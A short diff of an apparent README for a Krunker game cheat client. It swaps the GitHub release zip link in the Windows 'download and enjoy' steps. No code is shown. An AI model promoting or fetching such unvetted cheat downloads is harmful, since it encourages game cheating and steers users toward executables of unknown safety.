@@ -25,7 +25,7 @@ _________________________________________________________________________
 **ℍ𝕠𝕨 𝕥𝕠 𝕦𝕤𝕖 𝕥𝕙𝕚𝕤 𝕙𝕒𝕔𝕜? [ℂ𝕝𝕚𝕖𝕟𝕥]** [Works for 2.1.8 ✔️]
 
 ============[𝕎𝕀ℕ𝔻𝕆𝕎𝕊]============
-1. [ᴅᴏᴡɴʟᴏᴀᴅ ᴢɪᴘ (click here)](https://github.com/ZaresPlusX/Krunker_ZER0X/releases/download/0.1/krunker.skid.client.powered.by.Zares.X.zip)
+1. [ᴅᴏᴡɴʟᴏᴀᴅ ᴢɪᴘ (click here)](https://github.com/ZaresPlusX/Krunker_ZER0X/releases/download/0.1/Krunker.skid.ZaRes.X.release.zip)
 2. ᴇɴᴊᴏʏ
 
 ===============[𝕄𝔸ℂ]=============
